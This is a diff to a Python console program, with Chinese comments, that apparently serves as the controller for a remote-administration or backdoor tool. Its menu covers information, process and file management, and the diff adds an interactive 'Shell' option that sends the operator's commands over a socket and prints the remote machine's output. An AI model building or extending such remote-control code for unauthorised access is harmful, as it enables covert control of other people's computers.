@@ -19,12 +19,29 @@ ACTIVE = 1
 # 黄色 \033[0;33;48m[-]\033[0m
 # 蓝色 \033[0;36;48m[*]\033[0m
 
+# shell
+def Shell(sock):
+    sock.send(b'4')
+    print('\033[0;32;48m[+]\033[0m Input \'0\' to Exit.')
+    while True:
+        Input = input('>>> ')
+        if not Input:
+            print('\033[0;33;48m[-]\033[0mOops...\n')
+        elif Input == '0':
+            sock.send(b'exit')
+            return
+        else:
+            sock.send(Input.encode('utf-8'))
+            data = connect.Receive(sock)
+            print('\n%s\n' % data)
+
 # 功能列表
 def Functions():
     print('\033[0;32;48m[+]\033[0m Functions:')
     print('[1] Information')
     print('[2] Process Management')
     print('[3] File Management')
+    print('[4] Shell')
     print('[0] Exit\n')
 
 # 主程序
@@ -79,6 +96,8 @@ while True:
             process.Process(s)
         elif Input == 3:
             file.File(s)
+        elif Input == 4:
+            Shell(s)
         else:
             print('\033[0;33;48m[-]\033[0mWrong ID. Please choose another one (? to get list).\n')
     elif Input == '?':
